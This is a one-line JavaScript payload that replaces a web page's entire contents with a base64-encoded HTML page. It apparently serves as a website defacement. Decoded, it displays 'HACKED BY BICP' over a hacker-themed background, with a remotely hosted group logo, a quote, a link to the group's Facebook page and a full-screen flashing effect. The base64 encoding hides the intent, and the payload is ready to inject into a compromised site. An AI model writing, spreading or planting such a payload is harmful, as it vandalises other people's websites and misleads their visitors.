document.documentElement.innerHTML=atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhY2tlZCBieSBCSUNQPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1SdXNzbytPbmUmZGlzcGxheT1zd2FwJyk7CiAgICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9Q291cmllcitQcmltZSZkaXNwbGF5PXN3YXAnKTsKICAgICAgICBAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1PcmJpdHJvbjp3Z2h0QDcwMCZkaXNwbGF5PXN3YXAnKTsKCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdSdXNzbyBPbmUnLCBzYW5zLXNlcmlmOwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgICAgICAgICAgYmFja2dyb3VuZDogdXJsKCdodHRwczovL21lZGlhLmlzdG9ja3Bob3RvLmNvbS9pZC8xMzExNzk1MzU3L3ZlY3Rvci9oYWNrZXItYXR0YWNrLWN5YmVyc2VjdXJpdHktYnJlYWNoLXZlY3Rvci1nbGl0Y2guanBnP3M9NjEyeDYxMiZ3PTAmaz0yMCZjPUI0R0ttaXRwSFBIZlZsbDU5Q1NqTHprYnd5ZG5NT1Z5UnZYSGRKV2hLeHc9JykgY2VudGVyL2NvdmVyIG5vLXJlcGVhdDsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgfQoKICAgICAgICAub3ZlcmxheSB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgdG9wOiAwOwogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICByaWdodDogMDsKICAgICAgICAgICAgYm90dG9tOiAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuOCk7IC8qIERhcmtlciBvdmVybGF5IGZvciBiZXR0ZXIgY29udHJhc3QgKi8KICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBmbGV4LXN0YXJ0OyAvKiBBbGlnbiBpdGVtcyB0byB0aGUgdG9wICovCiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgcGFkZGluZzogMjBweDsKICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICB9CgogICAgICAgIC50ZWFtLWxvZ28gewogICAgICAgICAgICBtYXgtd2lkdGg6IDE1MHB4OwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgaGVpZ2h0OiBhdXRvOwogICAgICAgICAgICBib3JkZXI6IDRweCBzb2xpZCByZWQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCAwIDIwcHggcmdiYSgyNTUsIDAsIDAsIDAuNik7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7CiAgICAgICAgICAgIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjVzIGVhc2UtaW4tb3V0OwogICAgICAgICAgICBtYXJnaW4tdG9wOiAyMHB4OyAvKiBBZGQgc3BhY2UgZnJvbSB0aGUgdG9wICovCiAgICAgICAgfQoKICAgICAgICAudGVhbS1sb2dvOmhvdmVyIHsKICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICAgIH0KCiAgICAgICAgLmRlZmFjZS10ZXh0IHsKICAgICAgICAgICAgZm9udC1zaXplOiAzMHB4OwogICAgICAgICAgICBmb250LWZhbWlseTogJ1J1c3NvIE9uZScsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICBjb2xvcjogcmVkOwogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDE1cHggcmdiYSgyNTUsIDAsIDAsIDAuOSksIDAgMCAzMHB4IHJnYmEoMjU1LCAwLCAwLCAwLjcpOwogICAgICAgICAgICBtYXJnaW46IDEwcHggMDsKICAgICAgICAgICAgbGV0dGVyLXNwYWNpbmc6IDNweDsKICAgICAgICAgICAgYW5pbWF0aW9uOiBmYWRlSW5PdXQgMnMgZWFzZS1pbi1vdXQgaW5maW5pdGU7CiAgICAgICAgfQoKICAgICAgICBAa2V5ZnJhbWVzIGZhZGVJbk91dCB7CiAgICAgICAgICAgIDAlIHsgb3BhY2l0eTogMDsgfQogICAgICAgICAgICA1MCUgeyBvcGFjaXR5OiAxOyB9CiAgICAgICAgICAgIDEwMCUgeyBvcGFjaXR5OiAwOyB9CiAgICAgICAgfQoKICAgICAgICAucXVvdGUtdGV4dCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMjJweDsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIFByaW1lJywgbW9ub3NwYWNlOwogICAgICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgICAgIG1hcmdpbjogMjBweCAwOwogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDEwcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpLCAwIDAgMjBweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNik7CiAgICAgICAgICAgIG1heC13aWR0aDogODAlOwogICAgICAgIH0KCiAgICAgICAgLmxpbmstdGV4dCB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMThweDsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdPcmJpdHJvbicsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICMwMGZmMDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2UtaW4tb3V0OwogICAgICAgICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICAgICAgfQoKICAgICAgICAubGluay10ZXh0OmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwZmYwMDsKICAgICAgICAgICAgY29sb3I6IGJsYWNrOwogICAgICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEuMDUpOwogICAgICAgIH0KCiAgICAgICAgLmJsaW5rIHsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgIGxlZnQ6IDA7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC45KTsgLyogV2hpdGUgZmxhc2ggKi8KICAgICAgICAgICAgb3BhY2l0eTogMDsKICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgICAgICAgICAgIHotaW5kZXg6IDEwOwogICAgICAgICAgICBhbmltYXRpb246IGJsaW5rRWZmZWN0IDJzOwogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBibGlua0VmZmVjdCB7CiAgICAgICAgICAgIDAlLCAxMDAlIHsgb3BhY2l0eTogMDsgfQogICAgICAgICAgICA1MCUgeyBvcGFjaXR5OiAxOyB9CiAgICAgICAgfQoKICAgICAgICAvKiBBZGRpdGlvbmFsIHN0eWxpbmcgZm9yIHJlc3BvbnNpdmVuZXNzICovCiAgICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDc2OHB4KSB7CiAgICAgICAgICAgIC5kZWZhY2UtdGV4dCB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDI1cHg7CiAgICAgICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogMnB4OwogICAgICAgICAgICB9CgogICAgICAgICAgICAucXVvdGUtdGV4dCB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE4cHg7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC50ZWFtLWxvZ28gewogICAgICAgICAgICAgICAgbWF4LXdpZHRoOiAxMjBweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmxpbmstdGV4dCB7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiA1cHggOHB4OwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogNDgwcHgpIHsKICAgICAgICAgICAgLmRlZmFjZS10ZXh0IHsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMjBweDsKICAgICAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAxcHg7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC5xdW90ZS10ZXh0IHsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLnRlYW0tbG9nbyB7CiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDEwMHB4OwogICAgICAgICAgICB9CgogICAgICAgICAgICAubGluay10ZXh0IHsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDRweCA2cHg7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0ib3ZlcmxheSI+CiAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vZC50b3A0dG9wLmlvL3BfMzE2MjV3bzF5MC5wbmciIGFsdD0iVGVhbSBMb2dvIiBjbGFzcz0idGVhbS1sb2dvIj4KICAgICAgICA8aDEgY2xhc3M9ImRlZmFjZS10ZXh0Ij5IQUNLRUQgQlkgQklDUDwvaDE+CiAgICAgICAgPHAgY2xhc3M9InF1b3RlLXRleHQiPiJUaGUgcXVpZXRlciB5b3UgYmVjb21lLCB0aGUgbW9yZSB5b3UgYXJlIGFibGUgdG8gaGVhci4iPC9wPgogICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNzEwNjgzOTg1ODgiIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0ibGluay10ZXh0Ij5PdXIgUGFnZTwvYT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iYmxpbmsiPjwvZGl2PgogICAgPHNjcmlwdD4KICAgICAgICAvLyBKYXZhU2NyaXB0IHRvIHRyaWdnZXIgdGhlIGZ1bGwtc2NyZWVuIGJsaW5raW5nIGVmZmVjdAogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGJsaW5rID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJsaW5rJyk7CiAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgYmxpbmsuc3R5bGUub3BhY2l0eSA9IDE7CiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICBibGluay5zdHlsZS5vcGFjaXR5ID0gMDsKICAgICAgICAgICAgICAgIH0sIDIwMDApOyAvLyBCbGluayBsYXN0cyBmb3IgMiBzZWNvbmRzCiAgICAgICAgICAgIH0sIDEwMCk7CiAgICAgICAgfSk7CiAgICA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+');
